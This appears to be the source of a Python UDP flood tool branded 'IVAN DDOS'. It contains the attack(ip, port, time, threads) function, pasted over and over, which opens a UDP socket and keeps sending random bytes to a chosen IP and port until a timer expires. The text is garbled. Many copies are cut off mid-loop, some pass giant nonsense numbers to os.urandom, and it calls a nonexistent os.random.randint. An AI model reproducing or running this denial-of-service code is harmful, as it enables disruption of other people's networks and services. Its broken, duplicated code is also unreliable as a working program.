    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
